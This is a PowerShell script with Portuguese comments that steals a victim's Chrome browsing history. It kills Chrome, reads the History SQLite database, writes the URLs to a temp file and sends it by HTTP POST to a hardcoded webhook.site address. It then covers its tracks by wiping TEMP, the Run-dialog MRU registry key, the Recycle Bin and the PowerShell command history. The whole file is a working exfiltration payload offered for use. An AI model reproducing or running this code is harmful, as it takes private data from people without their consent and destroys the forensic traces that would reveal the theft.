# === CONFIGURAÇÕES (edite aqui antes de executar) ===

# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
$OutputFileDefault = Join-Path $env:TEMP 'ChromeHistory.txt'
# ====================================================


Function Get-ChromeDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputFile = $OutputFileDefault,

        [Parameter(Mandatory=$false)]
        [string]$ExportDir = $ExportDirDefault
    )

    # Criar pasta de exportação
    if (-not (Test-Path $ExportDir)) {
        New-Item -Path $ExportDir -ItemType Directory -Force | Out-Null
    }

    # Fechar Chrome se estiver em execução
    if (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
        Write-Warning "[!] Stopping Chrome..."
        Stop-Process -Name chrome -Force
    }

    # Localizar diretório de dados do Chrome
    $chromepath = if ([environment]::OSVersion.Version.Major -ge 6) {
        Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default'
    }
    else {
        Join-Path $env:HOMEDRIVE "${env:HOMEPATH}\Local Settings\Application Data\Google\Chrome\User Data\Default"
    }

    if (-not (Test-Path $chromepath)) {
        Throw "Chrome user data directory does not exist"
    }

    # Banco de histórico
    $historyDb = Join-Path $chromepath 'History'

    if (-not (Test-Path $historyDb)) {
        Throw "Chrome History database does not exist"
    }

    # Localizar assembly SQLite
    $assemblyPath = Join-Path $env:LOCALAPPDATA 'System.Data.SQLite.dll'

    if (-not (Test-Path $assemblyPath)) {
        Write-Warning "[!] SQLite assembly not found at: $assemblyPath"
        return
    }

    Add-Type -Path $assemblyPath

    # Ler histórico
    Write-Verbose "Parsing browsing history..."

    $history = @()

    $conn = New-Object System.Data.SQLite.SQLiteConnection(
        "Data Source=$historyDb;Version=3;"
    )

    try {
        $conn.Open()

        $cmd = $conn.CreateCommand()
        $cmd.CommandText = @"
SELECT url, title, visit_count
FROM urls
ORDER BY last_visit_time DESC
"@

        $reader = $cmd.ExecuteReader()

        while ($reader.Read()) {
            $history += [PSCustomObject]@{
                URL = $reader.GetString(
                    $reader.GetOrdinal('url')
                )

                Title = if (
                    $reader.IsDBNull(
                        $reader.GetOrdinal('title')
                    )
                ) {
                    '(null)'
                }
                else {
                    $reader.GetString(
                        $reader.GetOrdinal('title')
                    )
                }

                VisitCount = $reader.GetInt32(
                    $reader.GetOrdinal('visit_count')
                )
            }
        }

        $reader.Close()
    }
    finally {
        $conn.Close()
        $conn.Dispose()
    }

    # Garantir que o diretório do arquivo de saída exista
    $OutputParent = Split-Path $OutputFile -Parent

    if ($OutputParent -and -not (Test-Path $OutputParent)) {
        New-Item -Path $OutputParent -ItemType Directory -Force | Out-Null
    }

    # Gravar resultado
    @"
[*] HISTORY
"@ | Out-File -FilePath $OutputFile -Encoding UTF8

    if ($history) {
        $history |
            Format-Table -AutoSize |
            Out-File -FilePath $OutputFile -Append -Encoding UTF8
    }
    else {
        "  (none found)" |
            Out-File -FilePath $OutputFile -Append -Encoding UTF8
    }

    Write-Host "[+] History dump saved to: $OutputFile"

    # Retornar o caminho do arquivo para a variável $out
    return $OutputFile
}

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Envia e apaga o arquivo após envio
    try {
        # Lê o conteúdo do arquivo
        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8

        # Monta a string no formato "Titulo: conteudo"
        $payloadText = "${Titulo}: ${fileContent}"

        # Converte a string montada para bytes UTF-8
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)

        # Envia a requisição
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
}

######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace($out)) {
            $out =$OutputFile
        }

        Write-Host "Arquivo gerado em: $out"
        return $out
    } catch {
        Write-Error "Erro ao gerar arquivo: $_"
        exit 1
    }
}


####### Enviar ao Webhook ######
function Send-DumpToWebhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$WebhookUrl,

        [Parameter(Mandatory = $false)]
        [string]$Title = "Relatório de Dump",

        [Parameter(Mandatory = $false)]
        [string]$ExportDir,

        [Parameter(Mandatory = $false)]
        [switch]$RemoveExportDir
    )

    # Executa apenas se a URL do Webhook for informada
    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
        try {
            Write-Host "Enviando para webhook: $WebhookUrl"

            # Monta os parâmetros dinamicamente (Splatting)
            $splatParams = @{
                FilePath   = $FilePath
                WebhookUrl = $WebhookUrl
                Titulo     = $Title
            }

            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }

            # Executa a função interna de envio
            $sendResult = send_file_to_webhook @splatParams

            # Exibe o resultado checando o retorno do objeto
            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }

                Write-Host "Envio concluído: $fileSent em$timeSent"
            } else {
                Write-Host "Envio concluído com sucesso."
            }
        } catch {
            Write-Error "Erro durante envio para webhook: $_"
        }
    }
}

##### Funcao de Limpeza ####
function Clear-All {
    $ea = 'SilentlyContinue'
    rm "$env:TEMP\*" -r -fo -ea $ea
    rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
    Clear-RecycleBin -fo -ea $ea
    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
    echo "Limpeza concluída!"
}

#### Executa ####
$out = Invoke-DataDump `
    -DumpCommand { Get-ChromeDump -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
    -OutputFile $OutputFileDefault `
    -ExportDir $ExportDirDefault

Send-DumpToWebhook `
    -FilePath $out `
    -WebhookUrl $WebhookUrl `
    -Title "Histórico do Chrome" `
    -ExportDir $ExportDirDefault `
    -RemoveExportDir

Clear-All